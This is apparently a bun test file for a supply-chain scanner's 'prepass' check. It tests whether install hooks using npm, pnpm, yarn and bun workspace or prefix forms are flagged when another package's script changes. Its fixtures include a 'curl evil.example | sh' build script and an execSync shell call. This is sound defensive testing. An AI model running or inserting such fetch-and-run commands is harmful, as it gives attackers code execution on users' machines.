import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const SUB_OLD = { "sub/x.js": "1" };
const SUB_NEW = { "sub/x.js": "require('child_process').execSync('id')" };
const subManifest = (build: string) => ({ "sub/package.json": JSON.stringify({ name: "sub", version: "1", scripts: { build } }) });

// The hook names a runner form; only the given files change between old and new.
function held(scripts: object, oldFiles: Record<string, string>, newFiles: Record<string, string>): boolean {
  const base = { "package.json": pj(scripts) };
  return prepass("npm", map({ ...base, ...oldFiles }), map({ ...base, ...newFiles })).hard.some((s) => s.kind === "install-script");
}
const fileHeld = (hook: string) => held({ postinstall: hook, build: "echo ok", test: "echo ok" }, SUB_OLD, SUB_NEW);
const manifestHeld = (hook: string) => held({ postinstall: hook, build: "echo ok" }, subManifest("echo a"), subManifest("curl evil.example | sh"));

describe("a form that runs another package's script reads that package's manifest", () => {
  test("pnpm, yarn and bun workspace forms hold a changed script in another manifest", () => {
    for (const cmd of ["pnpm -C sub build", "pnpm --filter sub build", "pnpm -r build", "yarn workspace sub build", "yarn --cwd sub build", "bun --filter sub build", "bun run --workspaces build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("npm workspace forms and the wrapped forms hold it too", () => {
    for (const cmd of ["npm run build --prefix sub", "npm run build -w sub", "npx pnpm -C sub build", "corepack pnpm --filter sub build", "npx npm run build -w sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a form that stays in this package ignores another manifest", () => {
    for (const cmd of ["npm run build", "pnpm run build", "yarn build", "bun run build", "npm run build -- --prefix sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("npm forms that leave this package hold", () => {
  test("--prefix, -C, -w, --workspace and --workspaces do not resolve to the local script", () => {
    for (const cmd of ["npm run build --prefix sub", "npm --prefix sub run build", "npm --prefix=sub run build", "npm -C sub run build", "npm run build -w sub", "npm run build --workspace=sub", "npm run build -ws", "npm run build --workspaces", "npm test -w sub", "npm run -w sub build", "npm --workspace sub run build", "npm run build --include-workspace-root"]) {
      expect(fileHeld(cmd), cmd).toBe(true);
    }
  });

  test("a flag after -- belongs to the script, and a plain run stays local", () => {
    for (const cmd of ["npm run build", "npm run build -- -w sub", "npm test", "npm run build --silent"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("an unknown flag before the script name holds", () => {
  test("yarn, pnpm, bun and npm do not guess what a flag takes", () => {
    for (const cmd of ["yarn run -T build", "yarn -T build", "pnpm run --foo build", "pnpm --bar build", "pnpm run -T build", "bun run --bun build", "npm run --foo build", "yarn run -- build"]) {
      expect(fileHeld(cmd), cmd).toBe(true);
    }
  });

  test("known quiet flags still resolve to the local script", () => {
    for (const cmd of ["yarn run --silent build", "pnpm run --if-present build", "bun run build", "yarn build"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });
});
